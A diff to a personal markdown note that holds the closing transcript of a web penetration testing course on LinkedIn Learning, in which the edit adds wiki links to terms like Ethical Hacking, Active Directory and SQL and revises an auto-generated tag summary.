@@ -2397,17 +2367,17 @@ created: 2026-05-02
 >
 > **[0:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=47)** You'll find courses on all aspects of security.
 >
-> **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=50)** You can take additional courses on ethical hacking and pen testing, as well as courses which will prepare you for specific examinations and specific job roles.
+> **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=50)** You can take additional courses on [[Ethical Hacking]] and pen testing, as well as courses which will prepare you for specific examinations and specific job roles.
 >
 > **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=61)** I'd like to invite you to go to my author page where you can find more courses in the advanced pen testing series, as well as a wider coverage of security.
 >
-> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=70)** In particular, you may want to take a look at my more detailed active directory, SQL Injections and Advanced Techniques courses.
+> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=70)** In particular, you may want to take a look at my more detailed [[Active Directory]], [[SQL]] Injections and Advanced Techniques courses.
 >
 > **[1:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=79)** Thanks again for joining me on this course and I hope to see you again soon for more courses on pen testing and cyber security.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (7), web (3), [[Cybersecurity]] (1), [[Ethical Hacking]] (1), [[Active Directory]] (1)
+> **Frameworks & Libraries:** [[Cybersecurity]] (1), [[Ethical Hacking]] (1), [[Active Directory]] (1), [[SQL]] (1)
 > **CLI Commands:** find (2)
 > **Definitions:** is a  (2)
 > **Env Vars:** sql (1)
